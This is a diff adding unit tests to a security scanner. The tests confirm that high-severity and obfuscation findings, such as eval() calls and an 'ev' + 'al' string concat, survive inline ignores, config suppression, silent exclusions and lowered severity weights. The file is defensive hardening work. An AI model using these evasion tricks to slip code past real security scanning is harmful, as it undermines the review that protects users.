+            with open(p, "w") as f:
+                f.write(content)
+        return d
+
+    # ---- P2-1(a): HIGH is now protected at every lever ----
+    def test_high_not_suppressible_by_inline_ignore(self):
+        """eval() is HIGH; an inline ignore can no longer hide it (regex + AST paths)."""
+        d = self._make({"a.py": "eval(x)  # gatekeeper: ignore\n"})
+        try:
+            r = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(any("eval()" in f.message for f in r.findings),
+                            "a HIGH finding must not be inline-suppressible")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_high_not_suppressible_by_project_config(self):
+        """A target .gatekeeper.json cannot suppress a HIGH finding; the override is disclosed."""
+        d = self._make({"app.py": "eval(x)\n"})
+        try:
+            base = SecurityScanner(skip_deps=True).scan(d)
+            rid = next((f.rule_id for f in base.findings if "eval()" in f.message), None)
+            self.assertTrue(rid)
+            with open(os.path.join(d, ".gatekeeper.json"), "w") as f:
+                json.dump({"suppress": [{"rule": rid, "files": ["*"], "reason": "x"}]}, f)
+            r = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(any("eval()" in f.message for f in r.findings),
+                            "target config must not suppress a HIGH")
+            self.assertTrue(any("cannot silence" in w for w in r.warnings))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_obfuscation_critical_not_suppressible_by_inline_ignore(self):
+        """A CRITICAL string-concat obfuscation finding survives an inline ignore."""
+        d = self._make({"a.py": 'f = "ev" + "al"  # gatekeeper: ignore\n'})
+        try:
+            r = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(any("String concat assembles" in f.message for f in r.findings),
+                            "a CRITICAL obfuscation finding must not be inline-suppressible")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    # ---- P2-1(b): target exclusions are disclosed ----
+    def test_target_exclude_is_disclosed(self):
+        """A file dropped by a target-supplied exclude is disclosed, never silent."""
+        d = self._make({
+            "app.py": "print(1)\n",
+            "hidden.py": "eval(x)\n",
+            ".gatekeeper.json": json.dumps({"exclude": ["hidden.py"]}),
+        })
+        try:
+            r = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(any("excluded from scan by target config" in w and "hidden.py" in w
+                                for w in r.warnings),
+                            "target-supplied exclusions must be disclosed")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    # ---- P2-1(c): weight clamp ----
+    def test_target_weights_cannot_lower_high_below_default(self):
+        """A target cannot zero out HIGH weight to grade its HIGH-only repo as A."""
+        d = self._make({
+            "app.py": "eval(a)\neval(b)\neval(c)\n",
+            ".gatekeeper.json": json.dumps({"severity_weights": {"HIGH": 0}}),
+        })
+        try:
+            r = SecurityScanner(skip_deps=True).scan(d)
+            self.assertNotEqual(r.grade, "A", "target weights must not lower HIGH below the default")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    # ---- P2-2: forge precision ----
+    def test_signature_definition_file_requires_exact_package_path(self):
+        """SIGNATURE suppression files require the real package path, exact components."""
+        sc = SecurityScanner(skip_deps=True)
+        self.assertTrue(sc._is_signature_definition_file("gatekeeper_scanner/patterns.py"))
+        self.assertTrue(sc._is_signature_definition_file("gatekeeper_scanner/taint.py"))
+        self.assertTrue(sc._is_signature_definition_file("a/b/gatekeeper_scanner/yara_rules/x.yar"))
+        self.assertFalse(sc._is_signature_definition_file("src/patterns.py"))
+        self.assertFalse(sc._is_signature_definition_file("not_yara_rules/payload.yar"))
+        self.assertFalse(sc._is_signature_definition_file("patterns.py"))
+
+    # ---- P2-3: SVG is active text ----
+    def test_oversize_svg_disclosed(self):
+        """An oversize SVG (active text) is disclosed as a coverage gap, not silently skipped."""
+        d = self._make({"app.py": "print(1)\n"})
+        with open(os.path.join(d, "big.svg"), "w") as f:
+            f.write("<svg>" + ("A" * 600000) + "</svg>")
+        try:
+            r = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(any(g["path"] == "big.svg" and g["reason"] == "file_exceeds_500KB"
+                                for g in r.coverage_gaps),
+                            "an oversize SVG must be disclosed")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    # ---- P2-4: named phantom overflow ----
+    def test_phantom_overflow_lists_names(self):
+        """The phantom overflow disclosure lists the omitted package names, not just a count."""
+        deps = {f"ordphantom{i}": "1.0.0" for i in range(13)}
+        d = self._make({
+            "index.js": "console.log(1)\n",
+            "package.json": json.dumps({"name": "x", "version": "1.0.0", "dependencies": deps}),
+        })
+        try:
+            r = SecurityScanner(skip_deps=False).scan(d)
+            overflow = [w for w in r.warnings if "additional phantom" in w]
+            self.assertTrue(overflow, "overflow must be disclosed")
+            self.assertIn("ordphantom", overflow[0], "overflow disclosure must name the omitted packages")
         finally:
             shutil.rmtree(d, ignore_errors=True)
 
